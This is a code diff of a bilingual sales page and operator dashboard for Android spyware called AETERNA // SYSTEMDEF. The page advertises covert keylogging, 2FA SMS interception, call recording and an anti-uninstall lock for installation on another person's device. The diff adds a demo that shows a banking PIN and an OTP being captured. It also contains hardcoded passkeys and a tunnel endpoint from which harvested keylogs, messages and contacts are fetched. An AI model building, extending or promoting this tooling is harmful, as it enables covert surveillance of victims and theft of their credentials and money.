       <button class="modal-close-btn" onclick="closeAuthModal()">✕</button>
-      <div style="font-size: 32px; margin-bottom: 12px;">🛡️</div>
+      <div style="font-size: 36px; margin-bottom: 12px;">🛡️</div>
       <h3 class="modal-logo">AETERNA // SYSTEMDEF</h3>
       <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px;">
         SOVEREIGN CLIENT & ARCHITECT VAULT
@@ -1700,7 +2065,7 @@
   </div>
 
   <!-- ══════════════════════════════════════════════════════════════ -->
-  <!-- DASHBOARD SCREEN (ACTIVE HARDWARE TELEMETRY PORTAL) -->
+  <!-- LIVE DASHBOARD SCREEN (ACTIVE HARDWARE TELEMETRY PORTAL) -->
   <!-- ══════════════════════════════════════════════════════════════ -->
   <div id="dashboard-screen">
     <div class="dash-header">
@@ -1716,7 +2081,7 @@
         </div>
       </div>
       <div style="display: flex; gap: 12px; align-items: center;">
-        <div class="status-pill" id="role-indicator-pill" style="background: rgba(255, 184, 108, 0.1); border: 1px solid rgba(255, 184, 108, 0.4);">
+        <div class="status-pill" id="role-indicator-pill" style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4);">
           <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">👑 MASTER HUD</span>
         </div>
         <div class="status-pill" id="fleet-count-pill" style="background: rgba(0, 240, 255, 0.08); border: 1px solid rgba(0, 240, 255, 0.3);">
@@ -1726,7 +2091,7 @@
           <div class="pulse-dot"></div>
           <span id="live-records-count">INGESTION ACTIVE</span>
         </div>
-        <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(255, 85, 85, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">🚪 Изход</button>
+        <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(244, 63, 94, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">🚪 Изход</button>
       </div>
     </div>
 
@@ -1868,41 +2233,47 @@
   </div>
 
   <!-- ══════════════════════════════════════════════════════════════ -->
-  <!-- APPLICATION ENGINE & SCRIPT LAYER -->
+  <!-- SCRIPT ENGINE: INTERACTIVE PHONE, TERMINAL & WSS -->
   <!-- ══════════════════════════════════════════════════════════════ -->
   <script>
-    // 🔐 DUAL-TIER ACCESS MATRIX:
+    // Dual-Tier Access Keys
     const ARCHITECT_MASTER_KEYS = ["aeterna2026", "0x4121", "dimitar"];
     const GENERAL_USER_KEYS = ["vault2026", "telemetry777", "systemdef", "aeterna"];
 
     const HOST_ENDPOINT = "https://swim-adjustments-soldiers-personality.trycloudflare.com";
 
-    let currentUserRole = "GUEST"; // "ARCHITECT" or "VIEWER"
+    let currentUserRole = "GUEST";
     let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
     let selectedDeviceId = "ALL";
     let devicesList = [];
 
-    // BILINGUAL DICTIONARY (BG / EN)
+    // BILINGUAL DICTIONARY
     const i18n = {
       bg: {
         nav_overview: "Възможности",
-        nav_demo: "Live Демо",
+        nav_demo: "Интерактивен Дисплей",
         nav_deployment: "Терминал & Инсталация",
         nav_pricing: "Лицензиране",
         btn_login: "Вход за Клиенти",
         hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
         hero_title: "Автономна Мобилна Телеметрия и Дистанционен Контрол от Корпоративен Клас",
         hero_lead: "Специализирана платформа като услуга (PaaS), осигуряваща пълен контрол на екрана на живо, декриптиране на въведени клавиши (Keylogger) и одит на комуникациите с нулев системен отпечатък и непрекъсната автономия.",
+        hero_btn_demo: "📱 Изпробвай Дисплея на Живо",
         hero_btn_download: "📥 Свали Инсталатора (APK)",
-        hero_btn_demo: "👁️ Интерактивно Демо",
         hero_btn_login: "🔑 Въведи Лицензен Ключ",
-        metric_entropy: "Ентропия в покой (Zero CPU)",
-        metric_latency: "WebSocket Забавяне",
-        metric_persistence: "Anti-Uninstall Защита",
-        metric_encryption: "Post-Quantum TLS Enclave",
-        demo_tag: "КАКВО ПОЛУЧАВАТЕ СЛЕД АКТИВАЦИЯ",
-        demo_title: "Интерактивно Табло на Живо (Live Sandbox)",
-        demo_desc: "Тествайте симулацията по-долу: вижте как системата отразява екрана, прихваща разговори, декодира въведени пароли и отваря индивидуален изолиран портал за всеки клиент.",
+        demo_tag: "ИНТЕРАКТИВЕН ДИСПЛЕЙ В РЕАЛНО ВРЕМЕ",
+        demo_title: "Как Изглежда Телефонът и Какво Се Вижда",
+        demo_desc: "Кликнете върху приложенията на смартфона отляво или използвайте контролните бутони под него. Вижте как всяко действие се прихваща, декриптира и отразява в десния наблюдателен панел.",
+        phone_homescreen_sub: "Samsung S24 Ultra • Knox Protected",
+        app_banking: "Revolut",
+        app_gps: "GPS Радар",
+        app_settings: "Настройки",
+        phone_daemon_status: "🔒 SYSTEM SERVICES DAEMON ACTIVE",
+        phone_daemon_sub: "Фоново наблюдение 24/7 • 0% батерия в покой",
+        sim_btn_call: "Имитирай Обаждане",
+        sim_btn_sms: "Прихвани 2FA SMS",
+        sim_btn_key: "Напиши Парола",
+        sim_btn_block: "Тест Anti-Delete",
         term_tag: "АВТОНОМНО РАЗГРЪЩАНЕ",
         term_title: "Интерактивна Конзола за Инсталация",
         term_desc: "Вижте стъпка по стъпка как се инсталира софтуерът на чуждо устройство и как Telegram ботът веднага генерира самостоятелната изолирана сесия.",
@@ -1924,23 +2295,29 @@
       },
       en: {
         nav_overview: "Capabilities",
-        nav_demo: "Live Demo",
+        nav_demo: "Interactive Display",
         nav_deployment: "Deployment & APK",
         nav_pricing: "Licensing",
         btn_login: "Client Portal",
         hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
         hero_title: "Enterprise-Grade Mobile Endpoint Telemetry & Remote Control",
         hero_lead: "Dedicated Platform-as-a-Service (PaaS) engineered for corporate intelligence, real-time screen mirroring, unmasked keystroke audit, and silent communications oversight with zero runtime footprint.",
+        hero_btn_demo: "📱 Test Live Display",
         hero_btn_download: "📥 Download Installer (APK)",
-        hero_btn_demo: "👁️ Interactive Demo",
         hero_btn_login: "🔑 Enter Passkey",
-        metric_entropy: "Idle Entropy (Zero CPU)",
-        metric_latency: "WebSocket Round-Trip",
-        metric_persistence: "Anti-Uninstall Lock",
-        metric_encryption: "Post-Quantum TLS Enclave",
-        demo_tag: "WHAT HAPPENS UPON ACTIVATION",
-        demo_title: "Interactive Live Demonstration Sandbox",
-        demo_desc: "Explore the live simulation below: see how the system streams screen feeds, logs incoming calls, unmasks typed passwords, and generates isolated customer portals.",
+        demo_tag: "REAL-TIME INTERACTIVE DISPLAY",
+        demo_title: "What the Device Looks Like & What is Captured",
+        demo_desc: "Click the applications on the smartphone to the left or use the simulator controls below. See how every interaction is intercepted, decrypted, and streamed to the observer deck on the right.",
+        phone_homescreen_sub: "Samsung S24 Ultra • Knox Protected",
+        app_banking: "Revolut",
+        app_gps: "GPS Radar",
+        app_settings: "Settings",
+        phone_daemon_status: "🔒 SYSTEM SERVICES DAEMON ACTIVE",
+        phone_daemon_sub: "24/7 Silent Monitoring • 0% Idle Battery Drain",
+        sim_btn_call: "Simulate Call",
+        sim_btn_sms: "Intercept 2FA SMS",
+        sim_btn_key: "Type Password",
+        sim_btn_block: "Test Anti-Delete",
         term_tag: "AUTONOMOUS ENROLLMENT",
         term_title: "Interactive Deployment Console",
         term_desc: "Observe step-by-step how the software deploys to target hardware and how the Telegram engine provisions a dedicated session topic automatically.",
@@ -1993,15 +2370,135 @@
       }
     };
 
-    // Interactive Demo Tab Switcher
-    function switchDemoTab(tabId) {
-      document.querySelectorAll('.demo-tab-btn').forEach(b => b.classList.remove('active'));
-      document.querySelectorAll('.demo-tab-pane').forEach(p => p.classList.remove('active'));
+    // ══════════════════════════════════════════════════════════════
+    // INTERACTIVE SMARTPHONE LOGIC
+    // ══════════════════════════════════════════════════════════════
+    function openPhoneApp(appName) {
+      document.querySelectorAll('.phone-view').forEach(v => v.classList.remove('active'));
+      const target = document.getElementById('phone-view-' + appName);
+      if (target) {
+        target.classList.add('active');
+      }
+
+      // Feed telemetry into Observer Deck
+      appendKeyLog(`[APP_SWITCH] User opened: com.${appName}.app`);
+      appendPacket(`0xFE APP_FOCUS: com.${appName}.app (Foreground Active)`);
+    }
+
+    function returnPhoneHome() {
+      document.querySelectorAll('.phone-view').forEach(v => v.classList.remove('active'));
+      document.getElementById('phone-view-home').classList.add('active');
+      document.getElementById('anti-uninstall-overlay').classList.remove('active');
+      document.getElementById('call-overlay').classList.remove('active');
+      appendPacket(`0x01 GLOBAL_ACTION_HOME executed (Returned to Home)`);
+    }
+
+    let enteredPin = "";
+    function pressSimPin(digit) {
+      if (enteredPin.length < 4) {
+        enteredPin += digit;
+        document.getElementById('bank-pin-display').textContent = '•'.repeat(enteredPin.length);
+        
+        // Instant Live Unmasking into Observer Deck
+        appendKeyLog(`<span style="color:var(--red); font-weight:800;">[BANK_PIN_TAP]</span> Key: <strong>${digit}</strong> | Current Unmasked: <span style="color:var(--green); font-weight:800;">${enteredPin}</span>`);
+        appendPacket(`KEY_EVENT: KEYCODE_NUMPAD_${digit} -> Decrypted: ${digit}`);
+
+        if (enteredPin.length === 4) {
+          setTimeout(() => {
+            alert(`✔ ПИН Кодът бе прихванат в реално време: ${enteredPin}! Наблюдателното табло вече го записа.`);
+          }, 300);
+        }
+      }
+    }
+
+    function clearSimPin() {
+      enteredPin = "";
+      document.getElementById('bank-pin-display').textContent = "••••";
+    }
+
+    function triggerSimOtp() {
+      const toast = document.getElementById('phone-toast');
+      document.getElementById('toast-icon').textContent = "💬";
+      document.getElementById('toast-title').textContent = "SMS 2FA: Revolut";
+      document.getElementById('toast-desc').textContent = "Код за потвърждение: 914-882 за €25,000";
+      toast.classList.add('show');
+
+      appendKeyLog(`<span style="color:var(--gold); font-weight:800;">[2FA_INTERCEPT]</span> Carrier SMS: <code>Код за потвърждение: 914-882 за €25,000</code>`);
+      appendPacket(`0xA2 SMS_INTERCEPT: From=Revolut Body="Код: 914-882"`);
+
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 5000);
+    }
+
+    function triggerSimCall() {
+      const overlay = document.getElementById('call-overlay');
+      overlay.classList.add('active');
+      appendKeyLog(`<span style="color:var(--green); font-weight:800;">[CALL_RINGING]</span> Incoming: +41 22 819 0000 (Geneva HQ)`);
+      appendPacket(`0xC1 TELEPHONY_RINGING: Number="+41228190000" Codec=AMR-WB`);
+    }
+
+    function acceptSimCall() {
+      alert("📞 Обаждането е прието! В реална среда системата записва двупосочния аудио поток с нулев шум.");
+      endSimCall();
+    }
+
+    function endSimCall() {
+      document.getElementById('call-overlay').classList.remove('active');
+      appendPacket(`0xC2 TELEPHONY_IDLE: Call ended (Duration: 00:14)`);
+    }
+
+    function triggerSimTyping() {
+      openPhoneApp('telegram');
+      const streamMsg = document.getElementById('chat-stream-msg');
+      streamMsg.style.display = 'block';
+
+      appendKeyLog(`<span style="color:var(--red); font-weight:800;">[DECRYPTED_SECRET]</span> "Кодът за достъп до трезора е: <strong>S0ver3ign2026!</strong>"`);
+      appendPacket(`KEYSTROKE_BATCH: 23 chars captured from org.telegram.messenger`);
+    }
+
+    function triggerAntiUninstallDemo() {
+      const overlay = document.getElementById('anti-uninstall-overlay');
+      overlay.classList.add('active');
+      
+      appendKeyLog(`<span style="color:var(--red); font-weight:800;">[ANTI_UNINSTALL_TRIPPED]</span> User opened Settings. Accessibility Home-Lock fired!`);
+      appendPacket(`0x99 SECURITY_BREACH_PREVENTED: PackageInstaller blocked. Return to Home.`);
+
+      setTimeout(() => {
+        overlay.classList.remove('active');
+        returnPhoneHome();
+      }, 2800);
+    }
+
+    function appendKeyLog(html) {
+      const box = document.getElementById('key-stream-box');
+      if (box) {
+        const time = new Date().toLocaleTimeString();
+        const row = document.createElement('div');
+        row.className = 'packet-row';
+        row.innerHTML = `<span style="color:var(--muted);">[${time}]</span> ${html}`;
+        box.prepend(row);
+      }
+    }
+
+    function appendPacket(text) {
+      const box = document.getElementById('raw-packet-box');
+      if (box) {
+        const row = document.createElement('div');
+        row.style.color = 'var(--cyan)';
+        row.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+        box.prepend(row);
+      }
+    }
+
+    function switchObsTab(tabId) {
+      document.querySelectorAll('.obs-tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.obs-tab-pane').forEach(p => p.classList.remove('active'));
       document.getElementById(tabId).classList.add('active');
       event.currentTarget.classList.add('active');
     }
 
-    // Terminal Replay Animation
+    // Terminal Replay Sequence
     function replayTerminalSequence() {
       const term = document.getElementById('deployment-term-body');
       term.innerHTML = '<div class="term-line"><span class="term-info">Инициализиране на повторна симулация на разгръщането...</span></div>';
@@ -2028,27 +2525,21 @@
         } else {
           clearInterval(interval);
         }
-      }, 350);
+      }, 300);
     }
 
-    // Dynamic Typing Simulation in Demo Phone
-    const demoPhrases = [
-      "Passwd: S0ver3ign2026!",
-      "Confidential: Deal closed.",
-      "Meeting Zurich 14:00.",
-      "Transfer €250,000 to Vault."
-    ];
-    let demoPhraseIdx = 0;
+    // Phone Clock Ticker
     setInterval(() => {
-      const box = document.getElementById('sim-typing-text');
-      if (box) {
-        demoPhraseIdx = (demoPhraseIdx + 1) % demoPhrases.length;
-        box.textContent = demoPhrases[demoPhraseIdx];
-      }
-    }, 4000);
+      const now = new Date();
+      const str = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+      const clockEl = document.getElementById('phone-clock');
+      const bigClockEl = document.getElementById('phone-big-clock');
+      if (clockEl) clockEl.textContent = str;
+      if (bigClockEl) bigClockEl.textContent = str;
+    }, 1000);
 
     // ══════════════════════════════════════════════════════════════
-    // AUTHENTICATION & DASHBOARD TRANSITION
+    // AUTHENTICATION & DASHBOARD UNLOCK
     // ══════════════════════════════════════════════════════════════
     function verifyAuth() {
       const input = document.getElementById('passkey-input').value.trim().toLowerCase();
@@ -2114,7 +2605,6 @@
         }
       });
 
-      // If ordinary viewer with a locked device link, show ONLY that single device and hide selector controls
       if (currentUserRole === 'VIEWER' && selectedDeviceId && selectedDeviceId !== 'ALL') {
         const myDev = devices.find(d => d.deviceId === selectedDeviceId || d.device === selectedDeviceId) || { name: 'Моето Устройство', model: 'Android Phone', number: '' };
         sel.innerHTML = `<option value="${selectedDeviceId}" selected>🟢 ${myDev.name || myDev.model} ${myDev.number ? '(' + myDev.number + ')' : ''}</option>`;
@@ -2204,7 +2694,6 @@
         renderContacts();
         renderKeylogs();
 
-        // Update Side Feed and Telemetry
         const feedEl = document.getElementById('side-feed-list');
         const evs = filterByDevice(data.events || []);
         if (evs.length > 0) {
